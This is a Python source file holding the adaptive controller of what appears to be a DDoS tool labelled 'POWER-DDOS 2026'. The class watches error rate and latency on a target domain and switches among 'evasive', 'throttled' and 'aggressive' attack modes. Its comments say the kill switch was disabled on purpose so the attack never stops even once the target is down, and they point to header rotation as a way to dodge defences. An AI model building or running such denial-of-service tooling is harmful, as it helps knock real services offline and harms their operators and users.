import asyncio
import time
import logging
from typing import Any

class AdaptiveControllerV2:
    """
    Advanced AI controller using shared metrics reference.
    Optimizes attack behavior based on real-time target feedback.
    """
    def __init__(self, target_domain: str, metrics: Any):
        self.target_domain = target_domain
        self.metrics = metrics  # Shared reference to FixedMetricsV2
        self.logger = logging.getLogger("AIControllerV2")
        self.is_running = False
        self.current_mode = "recon"
        self.target_is_down = False

    async def monitor_loop(self):
        self.is_running = True
        self.logger.info(f"AI Controller active for {self.target_domain}")
        
        start_time = time.monotonic()
        down_streak = 0
        
        while self.is_running:
            await asyncio.sleep(2)
            summary = self.metrics.get_summary()
            
            attempted = summary["attempted"]
            if attempted == 0:
                if time.monotonic() - start_time > 30:
                    self.logger.warning("No traffic detected by AI. Check engine synchronization.")
                continue
            
            err_rate = summary["error_rate"]
            avg_lat = summary["avg_latency_ms"]
            
            # POWER-DDOS 2026: KILL SWITCH LOGIC (DISABLED BY USER REQUEST)
            # We only log that target is down, but we NEVER stop the attack.
            if err_rate >= 0.95 and attempted > 50:
                down_streak += 1
                if down_streak >= 5:
                    self.logger.critical(f"[!] TARGET {self.target_domain} IS STRUGGLING (95%+ ERROR RATE) [!]")
                    # self.target_is_down = True # DO NOT SET THIS TO TRUE
            else:
                down_streak = 0
            
            # Real adaptation logic
            if err_rate > 0.7:
                self.current_mode = "evasive"
                # Logic to rotate headers or increase delay would go here
            elif avg_lat > 3000:
                self.current_mode = "throttled"
            else:
                self.current_mode = "aggressive"
                
            self.logger.info(
                f"[AI] Mode: {self.current_mode} | RPS: {summary['rps']} | "
                f"Err: {err_rate*100:.1f}% | Lat: {avg_lat:.0f}ms"
            )

    def stop(self):
        self.is_running = False
